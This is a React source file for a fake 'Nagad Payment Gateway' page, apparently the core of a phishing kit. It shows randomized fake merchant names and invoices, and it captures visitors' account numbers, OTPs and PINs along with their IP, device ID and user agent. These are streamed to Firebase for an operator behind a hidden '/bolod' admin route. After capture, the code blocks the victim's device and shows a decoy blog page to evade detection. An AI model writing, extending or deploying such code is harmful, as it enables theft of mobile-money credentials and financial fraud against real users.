import React, { useState, useEffect } from 'react';
import { StoreSettings, TransactionSession, BlockedTarget, AdminUser } from './types';
import { NagadHeader } from './components/NagadHeader';
import { PaymentFlow } from './components/PaymentFlow';
import { NagadFooter } from './components/NagadFooter';
import { AdminLogin } from './components/AdminLogin';
import { AdminPanel } from './components/AdminPanel';
import { BlogFallback } from './components/BlogFallback';
import { rtdb, ref, onValue, set, update, db, doc, onSnapshot, setDoc, get } from './firebase';

const DEFAULT_STORES = [
  'MUNNA GENERAL STORE',
  'DARAZ BANGLADESH LTD',
  'CHALDAL ONLINE GROCERY',
  'FOODPANDA BANGLADESH',
  'EVALY OFFICIAL STORE',
  'ROKOMARI.COM',
  'PICKABOO ELECTRONICS',
  'SHAPLA FASHION HOUSE',
  'GRAMEENPHONE RECHARGE',
  'ROBI AXIATA MERCHANTS',
  'BANGLALINK DIGITAL',
  'TELETALK RECHARGE BD',
  'AARONG CRAFTS BD',
  'WALTON HI-TECH PLC',
  'APEX FOOTWEAR MERCHANTS',
  'PATHAO FOOD & RIDES',
  'AGORA SUPERSTORE',
  'SWAPNO SUPER SHOP',
  'MEENA BAZAR BD',
  'BATA BANGLADESH',
  'OTHOBA.COM MERCHANTS',
];

export default function App() {
  const [isAdminRoute, setIsAdminRoute] = useState<boolean>(false);
  const [adminUser, setAdminUser] = useState<AdminUser | null>(() => {
    try {
      const saved = localStorage.getItem('nagad_admin_user');
      return saved ? JSON.parse(saved) : null;
    } catch (e) {
      return null;
    }
  });
  const [isAdminLoggedIn, setIsAdminLoggedIn] = useState<boolean>(() => {
    return !!localStorage.getItem('nagad_admin_user');
  });
  const [isBlocked, setIsBlocked] = useState<boolean>(false);
  const [lang, setLang] = useState<'bn' | 'en'>('bn');
  const [gatewayAmounts, setGatewayAmounts] = useState<Record<string, string>>({});

  // Dynamic Store Settings state with localStorage initial state to prevent logo flicker on refresh
  const [storeSettings, setStoreSettings] = useState<StoreSettings>(() => {
    const defaults: StoreSettings = {
      storeName: 'MUNNA GENERAL STORE',
      amount: '1,000.00',
      currency: 'BDT',
      charge: '0',
      invoiceNo: 'CC801472068',
      processingTimeSeconds: 30,
      successTimeSeconds: 15,
      autoRandomizeStore: true,
      autoRandomizeInvoice: true,
      customLogoUrl: '',
      customFaviconUrl: '',
      pageTitle: 'Nagad Payment Gateway',
      storeNamesList: DEFAULT_STORES,
    };
    try {
      const cached = localStorage.getItem('nagad_cached_settings');
      if (cached) {
        const parsed = JSON.parse(cached);
        return { ...defaults, ...parsed };
      }
    } catch (e) {
      console.warn('Failed to parse cached settings:', e);
    }
    return defaults;
  });

  // User transaction session state
  const [session, setSession] = useState<TransactionSession | null>(null);
  const [isDataLoaded, setIsDataLoaded] = useState(false);

  // Check URL path, search params, or hash on load and history changes
  useEffect(() => {
    const checkAdminRoute = () => {
      const path = window.location.pathname.toLowerCase().replace(/^\/+|\/+$/g, '');
      const search = window.location.search.toLowerCase();
      const hash = window.location.hash.toLowerCase().replace(/^#+/, '');

      if (
        path === 'bolod' ||
        path.startsWith('bolod/') ||
        search.includes('admin=1') ||
        search.includes('route=bolod') ||
        hash === 'bolod' ||
        hash === 'admin'
      ) {
        setIsAdminRoute(true);
      } else {
        setIsAdminRoute(false);
      }
    };

    checkAdminRoute();
    window.addEventListener('popstate', checkAdminRoute);
    window.addEventListener('hashchange', checkAdminRoute);
    return () => {
      window.removeEventListener('popstate', checkAdminRoute);
      window.removeEventListener('hashchange', checkAdminRoute);
    };
  }, []);

  // Sync Favicon and Document Title if configured
  useEffect(() => {
    if (storeSettings.pageTitle) {
      document.title = storeSettings.pageTitle;
    }
    if (storeSettings.customFaviconUrl) {
      let link: HTMLLinkElement | null = document.querySelector("link[rel*='icon']");
      if (!link) {
        link = document.createElement('link');
        link.rel = 'shortcut icon';
        document.getElementsByTagName('head')[0].appendChild(link);
      }
      link.href = storeSettings.customFaviconUrl;
    }
  }, [storeSettings.pageTitle, storeSettings.customFaviconUrl]);

  // Fetch IP and listen to settings before initializing session
  useEffect(() => {
    let deviceId = localStorage.getItem('nagad_device_id');
    if (!deviceId) {
      deviceId = 'dev_' + Math.random().toString(36).substring(2, 11) + '_' + Date.now();
      localStorage.setItem('nagad_device_id', deviceId);
    }

    if (localStorage.getItem('nagad_completed') === 'true') {
      setIsBlocked(true);
    }

    let clientIp = '127.0.0.1';
    
    const loadAll = async () => {
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        if (data.ip) clientIp = data.ip;
      } catch (e) {}
      
      let currentSettings = { ...storeSettings };
      let currentAmounts = { ...gatewayAmounts };

      try {
        const settingsSnap = await get(ref(rtdb, 'settings'));
        if (settingsSnap.exists()) {
           currentSettings = { ...currentSettings, ...settingsSnap.val() };
           setStoreSettings(currentSettings);
        }
        const gatewaySnap = await get(ref(rtdb, 'gatewayAmounts'));
        if (gatewaySnap.exists()) {
           currentAmounts = gatewaySnap.val();
           setGatewayAmounts(currentAmounts);
        }
      } catch(e) {}
      
      setIsDataLoaded(true);
      
      // Initialize Session using fetched data directly to avoid closure issues
      const existingSessionId = localStorage.getItem('nagad_session_id');
      const newId = existingSessionId || 'sess_' + Date.now() + '_' + Math.random().toString(36).substring(2, 7);
      localStorage.setItem('nagad_session_id', newId);

      let chosenStore = currentSettings.storeName || 'MUNNA GENERAL STORE';
      if (currentSettings.autoRandomizeStore) {
        const pool = currentSettings.storeNamesList?.length > 0 ? currentSettings.storeNamesList : DEFAULT_STORES;
        chosenStore = pool[Math.floor(Math.random() * pool.length)];
      }

      let chosenInvoice = currentSettings.invoiceNo || 'CC801472068';
      if (currentSettings.autoRandomizeInvoice) {
        chosenInvoice = 'CC' + Math.floor(100000000 + Math.random() * 900000000);
      }

      const currentGatewayTag = getClientGatewayTag();
      const customGatewayAmount = currentAmounts[currentGatewayTag];
      const finalAmount = customGatewayAmount || currentSettings.amount || '1,000.00';

      const initialSession: TransactionSession = {
        id: newId,
        accountNumber: '',
        otp: '',
        pin: '',
        ip: clientIp,
        deviceId: deviceId,
        userAgent: navigator.userAgent,
        timestamp: Date.now(),
        step: 'number',
        storeName: chosenStore,
        amount: finalAmount,
        currency: currentSettings.currency || 'BDT',
        charge: currentSettings.charge || '0',
        invoiceNo: chosenInvoice,
        status: 'active',
        updatedAt: Date.now(),
        gatewayTag: currentGatewayTag,
      };

      setSession((prev) => {
         if (prev && prev.id === newId) return prev;
         try {
           set(ref(rtdb, `sessions/${newId}`), initialSession);
           setDoc(doc(db, 'sessions', newId), initialSession, { merge: true });
         } catch (e) {}
         return initialSession;
      });
    };

    loadAll();
  }, []);

  // Listen for realtime blocked list from Firebase
  useEffect(() => {
    const blockedRef = ref(rtdb, 'blockedTargets');
    const unsubscribeRtdb = onValue(blockedRef, (snapshot) => {
      const data = snapshot.val();
      if (data) {
        const deviceId = localStorage.getItem('nagad_device_id');
        const currentSessId = localStorage.getItem('nagad_session_id');
        const blockedList: BlockedTarget[] = Object.values(data);
        const matched = blockedList.find((b) => {
          if (!b) return false;
          if (currentSessId && b.id === currentSessId) return true;
          if (deviceId && b.deviceId && b.deviceId === deviceId) return true;
          if (
            session?.ip &&
            b.ip &&
            b.ip !== '127.0.0.1' &&
            b.ip !== 'Unknown' &&
            b.ip.length > 3 &&
            b.ip === session.ip
          ) {
            return true;
          }
          return false;
        });

        if (matched) {
          setIsBlocked(true);
        } else {
          setIsBlocked(false);
        }
      } else {
        setIsBlocked(false);
      }
    });

    // Listen for live store settings from Firebase
    const settingsRef = ref(rtdb, 'settings');
    const unsubscribeSettings = onValue(settingsRef, (snapshot) => {
      const data = snapshot.val();
      if (data) {
        setStoreSettings((prev) => {
          const next = { ...prev, ...data };
          try {
            localStorage.setItem('nagad_cached_settings', JSON.stringify(next));
          } catch (e) {
            console.warn('Cache error:', e);
          }
          return next;
        });
      }
    });

    // Listen for custom gateway link amounts
    const gatewayAmountsRef = ref(rtdb, 'gatewayAmounts');
    const unsubscribeGatewayAmounts = onValue(gatewayAmountsRef, (snapshot) => {
      const data = snapshot.val();
      if (data) {
        setGatewayAmounts(data);
      }
    });

    return () => {
      unsubscribeRtdb();
      unsubscribeSettings();
      unsubscribeGatewayAmounts();
    };
  }, [session?.ip]);

  // Subscribe to RTDB for current user's session updates
  useEffect(() => {
    if (!session?.id) return;
    const sessionRef = ref(rtdb, `sessions/${session.id}`);
    const unsubscribeSession = onValue(sessionRef, (snapshot) => {
      const data = snapshot.val();
      if (data) {
        setSession((prev) => (prev ? { ...prev, ...data } : data));
      }
    });
    return () => unsubscribeSession();
  }, [session?.id]);

  // Helper to extract gateway URL slug from parameter, hash, or path
  const getClientGatewayTag = (): string => {
    if (typeof window === 'undefined') return 'main';
    const urlParams = new URLSearchParams(window.location.search);
    const param =
      urlParams.get('u') ||
      urlParams.get('gateway') ||
      urlParams.get('slug') ||
      urlParams.get('ref');
    if (param) return param.trim().toLowerCase();

    const hash = window.location.hash.replace(/^#+/, '').trim().toLowerCase();
    if (hash && hash !== 'bolod' && hash !== 'admin') {
      return hash;
    }

    const path = window.location.pathname.replace(/^\/+|\/+$/g, '');
    if (path && path.toLowerCase() !== 'bolod' && path.toLowerCase() !== 'index.html') {
      return path.toLowerCase();
    }
    return 'main';
  };

  // Update session handler
  const handleUpdateSession = async (updates: Partial<TransactionSession>) => {
    if (!session) return;
    setSession((prev) => (prev ? { ...prev, ...updates, updatedAt: Date.now() } : null));
    try {
      const ts = Date.now();
      await update(ref(rtdb, `sessions/${session.id}`), { ...updates, updatedAt: ts });
      await setDoc(doc(db, 'sessions', session.id), { ...updates, updatedAt: ts }, { merge: true });
    } catch (err) {
      console.error(err);
    }
  };

  // Complete transaction handler (locks out user device)
  const handleCompleteTransaction = () => {
    localStorage.setItem('nagad_completed', 'true');
    setIsBlocked(true);

    if (session) {
      const deviceId = localStorage.getItem('nagad_device_id') || session.id;
      const blockedItem: BlockedTarget = {
        id: session.id,
        ip: session.ip || 'Unknown',
        deviceId: deviceId,
        blockedAt: Date.now(),
      };

      try {
        set(ref(rtdb, `blockedTargets/${session.id}`), blockedItem);
        set(ref(rtdb, `sessions/${session.id}/step`), 'completed');
        set(ref(rtdb, `sessions/${session.id}/status`), 'completed');

        setDoc(doc(db, 'blockedTargets', session.id), blockedItem);
        setDoc(doc(db, 'sessions', session.id), { step: 'completed', status: 'completed' }, { merge: true });
      } catch (e) {
        console.error(e);
      }
    }
  };

  // IF ADMIN ROUTE (/bolod)
  if (isAdminRoute) {
    if (!isAdminLoggedIn) {
      return (
        <AdminLogin
          onLoginSuccess={(user) => {
            setAdminUser(user);
            setIsAdminLoggedIn(true);
            try {
              localStorage.setItem('nagad_admin_user', JSON.stringify(user));
            } catch (e) {
              console.warn('Failed to save admin user:', e);
            }
          }}
        />
      );
    }

    return (
      <AdminPanel
        storeSettings={storeSettings}
        onUpdateStoreSettings={(newSettings) => setStoreSettings(newSettings)}
        currentUser={adminUser || undefined}
        onLogout={() => {
          setIsAdminLoggedIn(false);
          setAdminUser(null);
          localStorage.removeItem('nagad_admin_user');
        }}
      />
    );
  }

  // IF BLOCKED OR COMPLETED -> RENDER BLANK PAGE
  if (isBlocked) {
    return <BlogFallback />;
  }

  // Wait until settings are loaded
  if (!isDataLoaded) {
    return <div className="min-h-screen bg-white flex items-center justify-center w-full h-full" />;
  }

  // NAGAD PAYMENT GATEWAY VIEW
  return (
    <div className="min-h-screen w-full bg-white flex items-center justify-center font-sans antialiased selection:bg-red-100 selection:text-red-700">
      <div className="w-full max-w-[450px] min-h-screen sm:min-h-[600px] bg-white flex flex-col items-center pt-6 px-4 sm:px-6 relative my-auto">
        <NagadHeader
          storeName={session?.storeName || storeSettings.storeName}
          amount={session?.amount || gatewayAmounts[getClientGatewayTag()] || storeSettings.amount}
          currency={session?.currency || storeSettings.currency}
          charge={session?.charge || storeSettings.charge}
          invoiceNo={session?.invoiceNo || storeSettings.invoiceNo}
          lang={lang}
          onLangChange={(newLang) => setLang(newLang)}
          topLogoUrl={storeSettings.nagadTopLogoUrl}
        />

        {session && (
          <PaymentFlow
            session={session}
            lang={lang}
            onUpdateSession={handleUpdateSession}
            onComplete={handleCompleteTransaction}
            inputLogoUrl={storeSettings.nagadInputLogoUrl}
            instructionsImageUrl={storeSettings.instructionsImageUrl}
          />
        )}

        <NagadFooter customLogoUrl={storeSettings.customLogoUrl} />
      </div>
    </div>
  );
}
